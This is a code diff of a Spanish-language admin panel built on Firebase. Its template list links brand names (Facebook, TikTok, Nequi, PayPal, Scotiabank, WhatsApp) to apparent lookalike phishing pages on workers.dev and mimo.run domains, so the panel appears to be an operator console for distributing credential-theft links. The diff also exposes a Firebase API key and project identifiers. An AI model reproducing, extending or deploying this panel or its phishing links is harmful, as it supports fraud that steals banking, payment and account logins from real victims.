@@ -5,7 +5,7 @@ import {
   onSnapshot, deleteDoc, serverTimestamp, writeBatch, limit
 } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
 const firebaseConfig = {
-    apiKey: "AIzaSyBgqYhRV8CrmlMkr6yBF1DpE_zCgXIE660c",
+    apiKey: "AIzaSyBgqYhRV8CrmlMkr6yBF1DpE_zCgXIE660",
     authDomain: "panel-admi-633cd.firebaseapp.com",
     projectId: "panel-admi-633cd",
     storageBucket: "panel-admi-633cd.firebasestorage.app",
@@ -286,7 +286,7 @@ onAuthStateChanged(auth, async (user) => {
 // ================== ENLACES ÚNICOS ==================
 // (Todo igual, no toqué nada aquí)
 const plantillas = [
-  { nombre: "Facebook Basico", url: "https://1xru5c.mimo.run/index.html" },
+{ nombre: "Facebook Basico", url: "https://1xru5c.mimo.run/index.html" },
   { nombre: "Facebook Estandar", url: "https://facebook-estndar.glegogle5341-af7.workers.dev/" },
   { nombre: "TikTok", url: "https://tik-tok.glegogle5341-af7.workers.dev/" },
   { nombre: "Nequi Tarjeta", url: "https://nequi-tarjeta.glegogle5341-af7.workers.dev/" },
@@ -294,7 +294,6 @@ const plantillas = [
   { nombre: "Facebook Escritorio", url: "https://facebook-escritorio.glegogle5341-af7.workers.dev/" },
   { nombre: "PayPal Estandar", url: "https://paypalestndar.glegogle5341-af7.workers.dev/" },
   { nombre: "PayPal Basico", url: "https://paypal-basico.glegogle5341-af7.workers.dev/" },
-  { nombre: "Escotia Bank", url: "https://scotiabank.glegogle5341-af7.workers.dev/" },
   { nombre: "whatsapp Normal", url: "https://whatsappbass.glegogle5341-af7.workers.dev/" },
   { nombre: "whatsapp XxX Avance", url: "https://whatsappgrupo.glegogle5341-af7.workers.dev/" },
   { nombre: "Nequi Login Encuesta", url: "https://nequilogin.glegogle5341-af7.workers.dev/" },
@@ -1155,9 +1154,3 @@ document.querySelectorAll('.btn,#menuBtn,#chatSend,#fakeSelect,#chatPanel,#chatM
     actualizarUsuarios();
   }, 2000);
 })();
-
-
-
-
-
-
